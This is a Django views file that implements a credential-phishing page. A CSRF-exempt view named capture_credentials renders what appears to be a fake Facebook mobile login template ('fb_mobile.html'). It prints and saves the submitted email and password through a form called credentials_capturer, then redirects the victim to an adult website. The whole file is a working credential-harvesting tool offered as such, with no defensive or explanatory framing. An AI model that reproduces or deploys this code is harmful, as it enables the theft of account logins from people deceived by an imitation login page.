from django.shortcuts import render, redirect
from django.http import HttpResponse
from .forms import credentials_capturer
from django.http import HttpResponseRedirect
from django.views.decorators.csrf import csrf_exempt

@csrf_exempt
def capture_credentials(request):
    if request.method == 'POST':
        print(request.POST)
        form = credentials_capturer(request.POST, initial={'email': '', 'password': ''})
        if form.is_valid():
            email = form.cleaned_data['email']
            password = form.cleaned_data['password']
            # Do something with the email and password
            # ...
            form.save()
            return HttpResponseRedirect("https://xvideos.com")
    else:
        form = credentials_capturer()
    print(request.POST)
    return render(request, 'fb_mobile.html', {'form': form})